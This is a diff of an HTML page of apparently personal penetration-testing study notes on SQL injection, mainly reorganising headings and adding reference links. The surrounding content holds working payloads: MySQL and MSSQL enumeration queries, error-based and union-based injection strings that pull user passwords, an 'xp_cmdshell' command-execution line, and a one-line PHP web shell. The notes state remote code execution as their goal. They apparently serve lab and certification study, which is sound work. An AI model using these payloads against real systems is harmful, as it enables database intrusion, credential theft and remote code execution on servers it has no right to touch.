@@ -173,15 +173,18 @@
 
                 <div id="content" class="content">
                     <main>
-                        <h2 id="links"><a class="header" href="#links">Links</a></h2>
+                        <h2 id="sql"><a class="header" href="#sql">SQL</a></h2>
+<h3 id="links"><a class="header" href="#links">Links</a></h3>
 <ul>
 <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md">Payload All The Things</a></li>
 <li><a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">MSSQL Cheat Sheet</a></li>
+<li><a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/">SQL Injection Cheat Sheet</a></li>
+<li><a href="https://bhavsec.com/posts/mssql-rce/">From MSSQL to RCE</a></li>
 </ul>
-<h1 id="sqli"><a class="header" href="#sqli">SQLi</a></h1>
+<h3 id="sqli"><a class="header" href="#sqli">SQLi</a></h3>
 <p>Only Resources you will need to get Remote code using SQLi</p>
-<h2 id="mysql"><a class="header" href="#mysql">MYSQL</a></h2>
-<h3 id="authenticated-sqli"><a class="header" href="#authenticated-sqli">Authenticated SQLi</a></h3>
+<h3 id="mysql"><a class="header" href="#mysql">MYSQL</a></h3>
+<h4 id="authenticated-sqli"><a class="header" href="#authenticated-sqli">Authenticated SQLi</a></h4>
 <pre><code>SELECT version();
 SELECT system_user();
 show databases;
@@ -195,14 +198,14 @@ describe users; # describes columns in users' table
 SELECT * from &lt;test&gt;.&lt;users&gt;; # here test is DB and the user is a table in test db
 SELECT user, authentication_string FROM mysql.user WHERE user = 'test';bash
 </code></pre>
-<h3 id="error-based-sqli"><a class="header" href="#error-based-sqli">Error based SQLi</a></h3>
+<h4 id="error-based-sqli"><a class="header" href="#error-based-sqli">Error based SQLi</a></h4>
 <pre><code>tom' OR 1=1 -- //
 ' or 1=1 in (select @@version) -- //
 ' OR 1=1 in (SELECT * FROM users) -- //
 ' or 1=1 in (SELECT password FROM users) -- //
 ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- // # password for admin user
 </code></pre>
-<h3 id="union-based-sqli"><a class="header" href="#union-based-sqli">Union-based SQLi</a></h3>
+<h4 id="union-based-sqli"><a class="header" href="#union-based-sqli">Union-based SQLi</a></h4>
 <pre><code>*** injected UNION query has to include the same number of columns in the original query
 *** Data types need to be compatible between each column
 
@@ -225,8 +228,8 @@ SELECT user, authentication_string FROM mysql.user WHERE user = 'test';bash
 4) Enumrating few columns from the user table found above
 ' UNION SELECT null, username, password, description, null FROM users -- //
 </code></pre>
-<h2 id="mssql"><a class="header" href="#mssql"># MSSQL</a></h2>
-<h3 id="authenticated-sqli-1"><a class="header" href="#authenticated-sqli-1">Authenticated SQLi</a></h3>
+<h3 id="mssql"><a class="header" href="#mssql">MSSQL</a></h3>
+<h4 id="authenticated-sqli-1"><a class="header" href="#authenticated-sqli-1">Authenticated SQLi</a></h4>
 <pre><code>SELECT @@version;
 SELECT name FROM sys.databases; # master, tempdb, model and msdb are default
 SELECT * FROM offsec.information_schema.tables; # Returns table for offsec db
@@ -239,7 +242,7 @@ SELECT * from testuser.dbo.users; # We select dbo table schema between the db an
 admin lab # user # pass
 guest guest  # user # pass
 </code></pre>
-<h3 id="extra-notes-i-had"><a class="header" href="#extra-notes-i-had">Extra Notes I had</a></h3>
+<h4 id="extra-notes-i-had"><a class="header" href="#extra-notes-i-had">Extra Notes I had</a></h4>
 <pre><code>#### Line Comments
 
 **Comments out rest of the query.**   
@@ -325,14 +328,14 @@ EXECUTE xp_cmdshell 'whoami';
 &lt;? system($_REQUEST['cmd']); ?&gt;
 
 </code></pre>
-<h3 id="error-based-sql-injection"><a class="header" href="#error-based-sql-injection">Error-Based SQL Injection</a></h3>
+<h4 id="error-based-sql-injection"><a class="header" href="#error-based-sql-injection">Error-Based SQL Injection</a></h4>
 <ul>
 <li><strong>Goal</strong>: To generate an error message from the SQL database.</li>
 <li><strong>Method</strong>: Include SQL control characters or SQL code into a query.</li>
 <li><strong>Example</strong>: Inputting <code>' OR 1=1 --</code> in a user input field. If the backend query is <code>SELECT * FROM users WHERE username = '[input]'</code>, it becomes <code>SELECT * FROM users WHERE username = '' OR 1=1 --'</code>.</li>
 <li><strong>Result</strong>: The database returns an error or unexpected data, indicating vulnerability.</li>
 </ul>
-<h3 id="union-based-sql-injection"><a class="header" href="#union-based-sql-injection">Union-Based SQL Injection</a></h3>
+<h4 id="union-based-sql-injection"><a class="header" href="#union-based-sql-injection">Union-Based SQL Injection</a></h4>
 <ul>
 <li><strong>Goal</strong>: Retrieve data from other tables.</li>
 <li><strong>Method</strong>: Utilize the <code>UNION</code> SQL operator to combine results from multiple SELECT queries.</li>
@@ -343,13 +346,13 @@ EXECUTE xp_cmdshell 'whoami';
 </li>
 <li><strong>Consideration</strong>: Columns data types and number must match between the original and UNION query.</li>
 </ul>
-<h3 id="blind-sql-injection"><a class="header" href="#blind-sql-injection">Blind SQL Injection</a></h3>
+<h4 id="blind-sql-injection"><a class="header" href="#blind-sql-injection">Blind SQL Injection</a></h4>
 <ul>
 <li><strong>Goal</strong>: Retrieve data when no error message or data is directly returned.</li>
 <li><strong>Method</strong>: Ask the database a true/false question and determine the answer based on the application's response.</li>
 <li><strong>Example</strong>: Change a query to <code>SELECT * FROM users WHERE username = 'admin' AND 1=1 --</code>. If the page loads normally, the query is true. If it doesn't, the query is false.</li>
 </ul>
-<h3 id="time-based-sql-injection"><a class="header" href="#time-based-sql-injection">Time-Based SQL Injection</a></h3>
+<h4 id="time-based-sql-injection"><a class="header" href="#time-based-sql-injection">Time-Based SQL Injection</a></h4>
 <ul>
 <li><strong>Goal</strong>: Gather information from a database when no data is returned to the user.</li>
 <li><strong>Method</strong>: Use SQL commands that delay the response.</li>
